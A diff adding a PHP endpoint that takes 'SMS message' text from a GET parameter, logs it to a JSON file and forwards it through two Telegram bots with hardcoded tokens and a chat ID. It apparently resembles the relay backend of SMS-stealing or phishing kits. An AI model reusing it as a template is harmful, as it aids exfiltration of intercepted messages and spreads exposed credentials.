@@ -1,0 +1,111 @@
+<?php
+
+// Function to load existing messages from the file
+function loadMessages() {
+    $filePath = 'messages.json';
+
+    if (file_exists($filePath)) {
+        $messagesJson = file_get_contents($filePath);
+        return json_decode($messagesJson, true);
+    }
+
+    return [];
+}
+
+// Function to save messages to the file
+function saveMessages($messages) {
+    $filePath = 'messages.json';
+    $messagesJson = json_encode($messages, JSON_PRETTY_PRINT);
+    file_put_contents($filePath, $messagesJson);
+}
+
+// Function to send message to Telegram bot
+function sendToTelegramBot($text, $domainUrl) {
+    $telegramBotToken = '6067560181:AAG75GI2N-dm7u5Vc9eGNa1QkUWO2ExuGKg';
+    $chatId = '-1002164078253'; // You can obtain your chat ID by talking to the BotFather
+
+    $telegramApiEndpoint = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text' => "Message From 🚀 \n\n {$domainUrl} \n\n{$text}",
+    ];
+
+    $ch = curl_init($telegramApiEndpoint);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+
+    // Execute the cURL request
+    $response = curl_exec($ch);
+
+    // Close cURL session
+    curl_close($ch);
+
+    return $response;
+}
+
+// Another Telegram Chat
+function sendToTelegramBots($text, $domainUrl) {
+    $telegramBotTokens = '5827053736:AAEhGyQo_VGcIXlqMdL3XE5NVNu4Z8uVGFQ';
+    $chatIds = '-1002164078253'; // You can obtain your chat ID by talking to the BotFather
+
+    $telegramApiEndpoints = "https://api.telegram.org/bot{$telegramBotTokens}/sendMessage";
+    $params = [
+        'chat_id' => $chatIds,
+        'text' => "Message From 🚀 \n\n {$domainUrl} \n\n{$text}",
+    ];
+
+    $ch = curl_init($telegramApiEndpoints);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+
+    // Execute the cURL request
+    $response = curl_exec($ch);
+
+    // Close cURL session
+    curl_close($ch);
+
+    return $response;
+}
+
+// Extract domain URL from the request
+$domainUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+
+// Check if the 'text' parameter is present in the request
+if (isset($_GET['text'])) {
+    // Load existing messages
+    $messages = loadMessages();
+    
+    // Ensure $messages is an array
+if (!is_array($messages)) {
+    $messages = [];
+}
+
+
+
+    // Create a new SMS message
+    $newMessage = [
+        'id' => count($messages) + 1,
+        'message' => $_GET['text'],
+        'domain_url' => $domainUrl,
+        'date' => date('Y-m-d H:i:s'),
+    ];
+
+    // Add the new message to the list
+    $messages[] = $newMessage;
+
+    // Save the updated messages to the file
+    saveMessages($messages);
+
+    // Send the message to the Telegram bot
+    sendToTelegramBot($_GET['text'], $domainUrl);
+    sendToTelegramBots($_GET['text'], $domainUrl);
+
+    // Return the response JSON
+    echo json_encode(['message' => '200 ok']);
+} else {
+    // Return an error response if 'text' parameter is not present
+    echo json_encode(['message' => '404 not found']);
+}
+?>
